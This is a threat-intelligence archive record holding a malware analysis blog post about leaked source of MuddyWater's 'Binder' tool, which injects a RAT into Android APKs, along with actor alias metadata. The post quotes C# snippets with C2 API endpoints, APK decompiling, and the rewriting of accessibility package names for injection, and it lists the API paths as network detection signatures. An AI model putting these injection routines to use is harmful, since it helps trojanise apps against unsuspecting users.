{
    "id": "ed84d8fc-7bdd-4abb-923f-ede7d97715a7",
    "created_at": "2022-10-25T16:48:20.859357Z",
    "updated_at": "2025-03-27T02:16:14.091587Z",
    "deleted_at": null,
    "sha1_hash": "c09e4404fe00745c657cdbdaf5b1b65d3cf11403",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-05-16T13:02:17Z",
    "file_modification_date": "2021-05-16T13:02:17Z",
    "file_size": 144823,
    "plain_text": "# MuddyWater: Binder Project (Part 2)\n\n**[marcoramilli.com/2021/05/07/muddywater-binder-project-part-2/](https://marcoramilli.com/2021/05/07/muddywater-binder-project-part-2/)**\n\nView all posts by marcoramilli May 7, 2021\n\nBefore getting in the following Blog Post I would suggest you to read the “Part 1” of\n[MuddyWater Binder Project which is available HERE, where you might contestualize the](https://marcoramilli.com/2021/05/01/muddywater-binder-project-part-1/)\nCode Highlights.\n\n**Source Code Highlights**\n\nNow it’s time to get into more core pieces of code. Let’s start with the file\n```\nConnectionHandler.cs which is implementing the logic behind the Binder project.\n\n```\nAnalyzing the variable assignments at the beginning of the file we read the following code\n(snip)\n\n\n-----\n\n```\n[...]\nRedLogClass s = new RedLogClass();\n    private static string ip = \"http://192.168.20.87\";\n    private string getTaskUrl = ip + \"/api/get_sample\";\n    private string setStatusUrl = ip + \"/api/set_status\";\n    private string setStatusBindUrl = ip + \"/api/edit_bind\";\n    private string setPermRatUrl = ip + \"/api/add_rat_permission\";\n    private string setPermApkUrl = ip + \"/api/add_apk_permission\";\n    private string uploadUrl = ip + \"/api/add_file\";\n    private string downloadUrl = ip + \"/download/file/\";\n    private string ComparePermUrl = ip + \"/api/compare_perm\";\n    private string token =\n\"TNwTIJStt8RXaDAuzEzGKXcFhJQ0bMApq2PmProIa0GHcITvFzslMf8pWP5kdTBtEaQDaHAsq8lCNZRDmz\n[...]\n\n```\nSnipped from ConnectionHandler.cs\n\nMany interesting strings are telling a lot about the project and the threat actor. First of all\nwe have more API calls. For example\n```\nget_status, get_sample, add_apk_permission are telling us that we might detect\n\n```\nthis implant by a simple network probe looking for such a calls. In other words we might\ndetect Project Binder if we see those API on our network without the need to have a local\nengine. One more `token is precious to understand that more than a developer is`\nusing/developing the project. Indeed the token in `ConnectionHandler.cs is different to`\nthe one on `RedLogClass plus the listening IP addresses are belonging to the same`\nsubnet but not the same PC. Both of these information are suggesting we have more than\none developer on the project. Having the same private subnet `192.168.20.x would`\nprobably highlithg that developers are working in a common office or in the same building\nsharing the LAN, which take me into the idea that an organized group of people are\nworking on the project. On one hand having the same subnet it doesn’t actually mean that\npeople are on the same local area network, for example common private subnets such as\n```\n192.168.1.x, 10.10.10.x or 10.0.0.x are super common in many domestic\n\n```\ninfrastructures, however when subnets are not so common (like in this case:\n```\n192.168.20.x !”.20″!) finding the same subnet on two different systems (remember we\n\n```\ndo have different tokens and different listening IPs and same listening ports) is quite rare\nand it might suggest more developers in the same local area network are working on it.\n\nBut let’s focus back on the source code. Now it’s ime to check another leaked file called\n```\nFunctions.cs . Here we might observe the internal Binder Functions. We are not talking\n\n```\nabout API calls but rather how internally Binder works to decompile and to inject\nmalicious payloads into the original APK.\n\n\n-----\n\n```\n[...]\n public bool decompile(string rootPath, string id, string apkName)\n    {\n      string apkPath = rootPath + \"apks\\\\\" + id + \"\\\\\" + apkName + \".apk\";\n      string decompilePath = rootPath + \"apks\\\\\" + id + \"\\\\\" + apkName;\n      if (Directory.Exists((decompilePath)))\n      {\n        try\n        {\n          System.IO.Directory.Delete((decompilePath), true);\n        }\n        catch (Exception ex)\n        {\n          this.PostLog(\"Exception\", ex.Message);\n          System.IO.Directory.Move(decompilePath, decompilePath +\n\"_del\");\n        }\n      }\n      if (this.Execute(\"cmd.exe\", (\"/c java -jar \\\"\"\n              + (rootPath + \"tools\\\\\" + (\"apktool.jar\\\" d \\\"\\\" -f\n\\\"\"\n              + (apkPath + \"\\\" -o \\\"\\\"\" + decompilePath + \"\\\"\"))))))\n      {\n        this.PostLog(\"Information\", \"decompiling complete.\");\n        return true;\n      }\n      this.PostLog(\"Warning\", \"decompiling error.\");\n      return false;\n    }\n[...]\n\n```\nFunctions.cs snip\n\nAs you might appreciate from the previous code snip, Binder does not include internal\nnative functionalities to decompile APK neither it uses external libraries included into the\nMVS project. It launches simple command lines utilities such a apktool.jar. From here we\nmight deduce how the attacker machine should be configured. First of all, we have a\nWindows machine. Infact we might see from the decompiling function the way they run\napktool by cmd.exe, which is a native terminal tool in Microsoft Windows. APKTOOLS is a\nJava program so we may assume that the attacker (developer) machine needs to have\nJava installed and working in the native envirenment. So the attacker PC is a Windows\nBOX with Old version of Visual studio and two important tools: a JVM and apktools set.\nControls on code (by meaning input controlls) are quite light and it could be not such a\ndifficult to inject a command codeon by alteranting the APK name including `;`\ninterrumpting the `cmd.exe execution.`\n\n\n-----\n\n```\n[...]\n public bool editPnameOfAccessibility(string ratPath, string targetPath)\n    {\n      string orgAppKey = \"net.ronixi.dada/\";\n      string FilePath1 = ratPath +\n\"\\\\smali\\\\net\\\\ronixi\\\\dada\\\\dialog\\\\Access.smali\";\n      string FilePath2 = ratPath +\n\"\\\\smali\\\\net\\\\ronixi\\\\dada\\\\plugins\\\\CheckAccessibilityClass.smali\";\n      string package = getPackage(targetPath + \"\\\\AndroidManifest.xml\");\n      if (package != \"NON\")\n      {\n        string allText1 = File.ReadAllText(FilePath1);\n        string output1 = allText1.Substring(0,\nallText1.IndexOf(orgAppKey)) + package + \"/\" +\nallText1.Substring(allText1.IndexOf(orgAppKey) + orgAppKey.Length);\n        File.WriteAllText(FilePath1, output1);\n        string allText2 = File.ReadAllText(FilePath2);\n        string output2 = allText2.Substring(0,\nallText2.IndexOf(orgAppKey)) + package + \"/\" +\nallText2.Substring(allText2.IndexOf(orgAppKey) + orgAppKey.Length);\n        File.WriteAllText(FilePath2, output2);\n        this.PostLog(\"Information\", \"Accessibility Packages of Rat\nEdited.\");\n        return true;\n      }\n      else\n      {\n        this.PostLog(\"Warning\", \"Accessibility Packages of Rat not\nEdited.\");\n        return false;\n      }\n    }\n[...]\n\n```\nOne more function in Functions.cs snip\n\nSuper interesting to note which are the Organization Path Name before prepare the\ninkection. It’s like the organization name `ronixi would be quite interesting to be`\nmonitored or to perform research for this string ver the following months. It is quite\n[interesting what you can find on VT by searching for this string (HERE) – many wired and](https://www.virustotal.com/gui/search/ronixi/files)\nnew payloads into PDF files. One more interesting action is coming from the following\nfunction ( editSDK ) in the same leaked source code. The attacker changes the SDK\nversion to 22…\n\n\n-----\n\n```\n[...]\n public void editSDK(string targetPath)\n    {\n      string orgAppKey = \"targetSdkVersion: '\";\n      string FilePath = targetPath + \"\\\\apktool.yml\";\n      string allText = File.ReadAllText(FilePath);\n      string output = allText.Substring(0, allText.IndexOf(orgAppKey) +\norgAppKey.Length) + \"22\" + allText.Substring(allText.IndexOf(orgAppKey) +\norgAppKey.Length + 2);\n      File.WriteAllText(FilePath, output);\n      this.PostLog(\"Information\", \"SDk version change to 22.\");\n    }\n[...]\n\n```\nOne more function in Functions.cs snip\n\nOne more sintax mistake on line 392 of Function.cs supporting the non English speaker\nhyphothesis – `this.PostLog(\"Information\", \"injecte code to lancher`\n```\nactivity done.\"); .\n\n```\n**Conclusions**\n\nThreat attribution process is always hard and for several reasons an error oriented\nprocess (just think to false flags). According to Lab Dookhtegan this source code is\nallegedly attributed to MuddyWater, if it’s is true, now we do know a little bit more about\nhow do they develop and how do they “think code”, nevertheless we do have some\nnetwork signatures that could be used to detect Binder in network analyses. These are\nnot strong IoC (this is why I didn’t add an IoC section) since many different applications\ncould potentially use the same API names but, if you consider an “union” of them (more\nsingle and different detections from the same source), we might endup if Binder is\ninstalled on your network or not. Interesting API to monitor: “/api/get_sample”;\n“/api/set_status”; “/api/edit_bind”; “/api/add_rat_permission”; “/api/add_apk_permission”;\n\n“/api/add_file”; “/download/file/”; “/api/compare_perm”; Have a nice weekend !\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.05.07.MuddyWater_Binder_2/MuddyWater%20Binder%20Project%20Part%202.pdf"
    ],
    "report_names": [
        "MuddyWater Binder Project Part 2"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1621170137,
    "ts_modification_date": 1621170137,
    "files": {
        "pdf": "https://archive.orkl.eu/c09e4404fe00745c657cdbdaf5b1b65d3cf11403.pdf",
        "text": "https://archive.orkl.eu/c09e4404fe00745c657cdbdaf5b1b65d3cf11403.txt",
        "img": "https://archive.orkl.eu/c09e4404fe00745c657cdbdaf5b1b65d3cf11403.jpg"
    }
}